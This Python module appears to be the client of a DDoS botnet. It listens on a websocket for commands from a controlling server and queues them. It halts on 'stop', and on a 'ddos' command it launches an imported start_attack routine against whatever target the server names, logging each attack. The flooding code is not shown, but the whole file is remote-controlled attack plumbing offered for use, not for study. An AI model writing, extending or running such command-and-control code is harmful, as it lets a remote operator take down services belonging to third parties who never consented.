import logging
import json

from asyncio import Queue
from models import Action
from sanic.server.websockets.impl import WebsocketImplProtocol

from scripts.exceptions import CannotGetActionFromServerException
from scripts.services.attack_services import start_attack
from pydantic import ValidationError


logger = logging.getLogger(__package__)


async def get_action_from_server(ws: WebsocketImplProtocol) -> Action:
    response = json.loads(await ws.recv())
    raw_action = response.get('action')
    if raw_action is None:
        raise CannotGetActionFromServerException(response=response)

    return Action(**raw_action)


async def wait_for_actions_from_server(ws: WebsocketImplProtocol, queue: Queue):
    """
        Waits for the server to send an action, and puts this action into <queue>
        Raises CannotGetActionFromServerException if server sent a bad action
    """
    while True:
        try:
            await queue.put(await get_action_from_server(ws))
        except ValidationError as e:
            raise CannotGetActionFromServerException(validation_errors=e.errors())


async def is_needed_to_stop(action: Action) -> bool:
    """Returns True if action is stop"""
    if action.command.title == 'stop':
        return True
    return False


async def dispatch_action(action: Action):
    if action.command.title == 'ddos':
        logger.info(f"Starting attack on: {action.target}")
        result = await start_attack(action.target)
        logger.info(f"Attack stopped on: {action.target}")
        return result


